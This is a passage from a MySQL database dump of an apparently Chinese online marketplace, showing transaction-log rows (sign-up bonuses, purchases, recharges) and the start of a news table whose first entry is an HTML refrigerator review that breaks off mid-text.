(1026, '1556605295', 885, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1014, '1556605294', 873, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1015, '1556605294', 874, '注册会员赠送金额', 1000, '2019-04-30 14:21:34', '115.194.38.239', NULL, NULL, NULL),
(1016, '1556605295', 875, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1017, '1556605295', 876, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1018, '1556605295', 877, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1019, '1556605295', 878, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1020, '1556605295', 879, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1021, '1556605295', 880, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1022, '1556605295', 881, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1023, '1556605295', 882, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1024, '1556605295', 883, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1025, '1556605295', 884, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1091, '1556605295', 950, '注册会员赠送金额', 1000, '2019-04-30 14:21:35', '115.194.38.239', NULL, NULL, NULL),
(1092, '1557470946', 951, '注册会员赠送金额', 1000, '2019-05-10 14:49:06', '111.37.249.129', NULL, NULL, NULL),
(1093, '1557564001', 952, '注册会员赠送金额', 1000, '2019-05-11 16:40:01', '125.127.38.92', NULL, NULL, NULL),
(1094, '1557595108', 14, '同步金额数字', 0, '2019-05-12 01:18:28', '223.157.119.76', NULL, NULL, NULL),
(1095, '1557595113', 14, '帐户金额充值', 50000, '2019-05-12 01:18:33', '223.157.119.76', NULL, NULL, NULL),
(1096, '1557595178', 14, '购买商品,数量1', -30, '2019-05-12 01:19:38', '223.157.119.76', NULL, NULL, NULL),
(1097, '1557595276', 14, '购买商品,数量1', -200, '2019-05-12 01:21:16', '223.157.119.76', NULL, NULL, NULL),
(1098, '1557595471', 14, '购买商品,数量1', -200, '2019-05-12 01:24:31', '223.157.119.76', NULL, NULL, NULL),
(1099, '1557595775', 14, '购买商品,数量1', -200, '2019-05-12 01:29:35', '223.157.119.76', NULL, NULL, NULL),
(1100, '1557726277', 953, '注册会员赠送金额', 1000, '2019-05-13 13:44:37', '42.236.177.24', NULL, NULL, NULL),
(1101, '1557726298', 953, '购买商品,数量1', -150, '2019-05-13 13:44:58', '42.236.177.24', NULL, NULL, NULL),
(1102, '1557730372', 953, '购买商品,数量1', -100, '2019-05-13 14:52:52', '42.236.177.24', NULL, NULL, NULL),
(1103, '1557730471', 954, '注册会员赠送金额', 1000, '2019-05-13 14:54:31', '42.236.177.24', NULL, NULL, NULL),
(1104, '1557730471', 955, '注册会员赠送金额', 1000, '2019-05-13 14:54:31', '42.236.177.24', NULL, NULL, NULL),
(1105, '1557733278', 955, '购买商品,数量1', -100, '2019-05-13 15:41:18', '42.236.177.24', NULL, NULL, NULL),
(1106, '1557733344', 955, '购买商品,数量1', -150, '2019-05-13 15:42:24', '42.236.177.24', NULL, NULL, NULL),
(1107, '1557733344', 955, '购买商品,数量1', -200, '2019-05-13 15:42:24', '42.236.177.24', NULL, NULL, NULL),
(1108, '1557733349', 954, '1', 1, '2019-05-13 15:42:29', '222.186.150.111', NULL, NULL, NULL),
(1109, '1557733520', 955, '购买商品,数量5', -500, '2019-05-13 15:45:20', '42.236.177.24', NULL, NULL, NULL),
(1110, '1557733561', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金40元', 160, '2019-05-13 15:46:01', '223.157.124.203', NULL, NULL, NULL),
(1111, '1557937727', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金40元', 160, '2019-05-16 00:28:47', '223.157.128.148', NULL, NULL, NULL),
(1112, '1558843380', 956, '注册会员赠送金额', 1000, '2019-05-26 12:03:00', '61.151.178.167', NULL, NULL, NULL),
(1113, '1559047368', 957, '注册会员赠送金额', 1000, '2019-05-28 20:42:48', '182.97.64.138', NULL, NULL, NULL),
(1115, '1559379317', 959, '注册会员赠送金额', 1000, '2019-06-01 16:55:17', '223.157.116.113', NULL, NULL, NULL),
(1116, '1559721664', 960, '注册会员赠送金额', 1000, '2019-06-05 16:01:04', '113.65.214.4', NULL, NULL, NULL),
(1117, '1559723843', 960, '会员等级提升', -20, '2019-06-05 16:37:23', '113.65.214.4', NULL, NULL, NULL),
(1118, '1559808135', 961, '注册会员赠送金额', 1000, '2019-06-06 16:02:15', '111.226.203.167', NULL, NULL, NULL),
(1119, '1559808225', 961, '购买商品,数量1', -100, '2019-06-06 16:03:45', '111.226.203.167', NULL, NULL, NULL),
(1120, '1559922324', 962, '注册会员赠送金额', 1000, '2019-06-07 23:45:24', '49.74.37.184', NULL, NULL, NULL),
(1121, '1559922349', 962, '购买商品,数量1', -100, '2019-06-07 23:45:49', '49.74.37.184', NULL, NULL, NULL),
(1122, '1560053102', 15, '购买自助广告位ADP01', -90, '2019-06-09 12:05:02', '120.243.52.232', NULL, NULL, NULL),
(1123, '1560245088', 963, '注册会员赠送金额', 1000, '2019-06-11 17:24:48', '122.96.47.132', NULL, NULL, NULL),
(1124, '1560477002', 964, '注册会员赠送金额', 1000, '2019-06-14 09:50:02', '118.249.120.92', NULL, NULL, NULL),
(1125, '1560492581', 965, '注册会员赠送金额', 1000, '2019-06-14 14:09:41', '1.194.64.111', NULL, NULL, NULL),
(1126, '1560539241', 966, '注册会员赠送金额', 1000, '2019-06-15 03:07:21', '180.123.223.218', NULL, NULL, NULL),
(1127, '1560699405', 967, '注册会员赠送金额', 1000, '2019-06-16 23:36:45', '106.58.231.149', NULL, NULL, NULL),
(1128, '1560700084', 967, '购买商品,数量1', -600, '2019-06-16 23:48:04', '106.58.231.149', NULL, NULL, NULL),
(1129, '1560741320', 968, '注册会员赠送金额', 1000, '2019-06-17 11:15:20', '42.236.179.84', NULL, NULL, NULL),
(1130, '1560933759', 969, '注册会员赠送金额', 1000, '2019-06-19 16:42:39', '219.157.183.249', NULL, NULL, NULL),
(1131, '1560933767', 969, '购买商品,数量1', -600, '2019-06-19 16:42:47', '219.157.183.249', NULL, NULL, NULL),
(1132, '1560933974', 970, '注册会员赠送金额', 1000, '2019-06-19 16:46:14', '219.157.183.249', NULL, NULL, NULL),
(1133, '1561055287', 971, '注册会员赠送金额', 1000, '2019-06-21 02:28:07', '111.174.81.55', NULL, NULL, NULL),
(1134, '1561062006', 972, '注册会员赠送金额', 1000, '2019-06-21 04:20:06', '58.243.254.3', NULL, NULL, NULL),
(1135, '1561081388', 973, '注册会员赠送金额', 1000, '2019-06-21 09:43:08', '1.194.69.228', NULL, NULL, NULL),
(1136, '1561104552', 974, '注册会员赠送金额', 1000, '2019-06-21 16:09:12', '119.130.215.237', NULL, NULL, NULL),
(1137, '1561104627', 974, '购买商品,数量1', -100, '2019-06-21 16:10:27', '119.130.215.237', NULL, NULL, NULL),
(1138, '1561104689', 974, 'QQ钱包充值0.1元', 0.1, '2019-06-21 16:11:29', '49.234.36.214', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_news`
--

CREATE TABLE IF NOT EXISTS `yjcode_news` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `type1id` int(11) DEFAULT NULL,
  `type2id` int(11) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `txt` longtext,
  `djl` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `lastsj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `bh` char(50) DEFAULT NULL,
  `ifjc` int(11) DEFAULT NULL,
  `titys` char(20) DEFAULT NULL,
  `zze` char(50) DEFAULT NULL,
  `ly` char(50) DEFAULT NULL,
  `lyurl` varchar(250) DEFAULT NULL,
  `wkey` varchar(250) DEFAULT NULL,
  `wdes` text,
  `zt` int(11) DEFAULT NULL,
  `iftp` int(11) DEFAULT NULL,
  `indextop` int(10) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=35 ;

--
-- 转存表中的数据 `yjcode_news`
--

INSERT INTO `yjcode_news` (`id`, `type1id`, `type2id`, `tit`, `txt`, `djl`, `sj`, `lastsj`, `uip`, `bh`, `ifjc`, `titys`, `zze`, `ly`, `lyurl`, `wkey`, `wdes`, `zt`, `iftp`, `indextop`, `userid`) VALUES
(6, 21, 30, '高科技加豪华大空间 松下W620TX法式冰箱评测', '<p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">问过很多身边的朋友你对一款冰箱都有哪些期待，得到最多的回答就是外观要美，空间要大，耗电要低。很多朋友还会有更多的要求，比如要能够干燥保鲜，能够有微冻功能，能够有互联网控制的功能。这么多要求，能够有一款冰箱，满足所有人对冰箱的想象么?</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　从外到内深入了解了松下W620TX法式冰箱后，再回看这些问题，答案是能，它能满足人对冰箱的所有想象。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　第一眼的豪华</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX第一眼看去，就有种大气、豪华的气场扑面而来，从站在它面前，法式冰箱特有的宽大尺寸就给人足够的压迫感，再加上拥有拉丝纹路的玻璃面板材质，恰到好处的金属装饰条，镶嵌在前面板上的LED显示屏，都在无声地向用户传达着属于它的豪华感。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/42bfa7a4e2f0935f6af1235d3571402c.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="376" border="1"/></center><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/340b49629739e68194c9af0678a9d07f.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　玻璃面板下透出的金属拉丝材质，让这台冰箱的豪华感扑面而来</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/bc43cf96c904ec12c4aa499db85ebd2c.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　镶嵌在前面板上的LED显示屏可以清晰直观地显示目前冷冻、冷藏的温度，还可以快速调整运行模式，假日，节能以及快速制冰功能都可以在这个操作面板上直接操作，它需要按住3秒以上才能解锁，因此也不必担心日常使用中的误触</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/7660ba06e50b98d79004c9d210d060ba.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="280" height="30" border="1"/></center><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/1618b63254925b172b0ef350dcc763ed.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　丝丝细致的金属拉丝工艺，向人无声地诉说着这台冰箱的质感</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/cebd1ada5eff5709b18a02ff9516f80d.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX的铝合金边框把手采用与iphone同样的CNC切割工艺，把手部分摸上去柔和细腻，看似锋芒毕露的金属切割质感把手，却完全没有尖锐的感觉，触感非常舒服。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX的豪华感不仅仅在外观，拉开冰箱门，内部的金属装饰设计，以及从冷藏到冷冻的LED照明系统，以及视觉、触觉上都能让人感受高品质的隔断、抽屉的组合，让人可以感受到它由外及内的统一标准，出色品质。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/34b19265d7dfeb58ae41b7c8c77bd8c2.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX采用了全LED照明系统，反应速度快，亮度高</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/a8a13137d4b2149b8b5d1c954d86950b.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　每层的隔板前端都安装了金属装饰条，与外观配合显得质感十足</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/7754b087aa6ec7385d9a11acfc36a5cd.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　顶部有松下W620TX的多重循环制冷系统的标识</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/265e6fda9e725050b7c7091ad0e69fb2.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　隔板、抽屉这些细节，也都处理得让人感觉很有质感</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　让人惊喜的空间感</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　不得不说，松下W620TX的空间实在是令人满意，无论是冷藏室还是冷冻室，都给人非常宽阔的感觉。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/58251526a452922fafb6326e541d4153.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="280" height="30" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX拥有对开式的冷藏室，以及抽屉式的冷冻室，首先来看看上方的冷藏室。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/5e84bc0fbb78d4e5843309e8d3d23a0f.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　饮料，水果，牛奶，甚至一般冰箱都只能横着放进去的红酒，松下W620TX都可以轻松容纳</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/580470b55e3218fdd825e805114551e5.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX隔板之间的层高很高，除了最上面一层之外，其余的竖着放进500ml的易拉罐啤酒还能空余很多空间出来，各种大小的密封盒至少可以叠4层</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/aff0c00e3d7f887ba37e24afc5f96375.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="280" height="30" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　冷藏室上方是三个隔板隔出来的空间，下方是两个多功能抽屉，以及干燥室以及微冻室</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/f307d4740fb15a2eb452c706a6652e61.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="280" height="30" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　隔板下方的两个果蔬盒，平时用来存放家庭里用量很大的水果、蔬菜等食材，不会被冰箱中的其他部分的味道影响，相当方便。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/07bfe67ce6fb0666bff1705f00d24bb5.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　冷藏室左下方的臻材室，它可以做到最低20%湿度干燥储存，对于一些对湿度敏感的食材来说，它是一个绝佳的存放处</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/5f8ddf43e7c46fb8136ddbae4e878e50.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　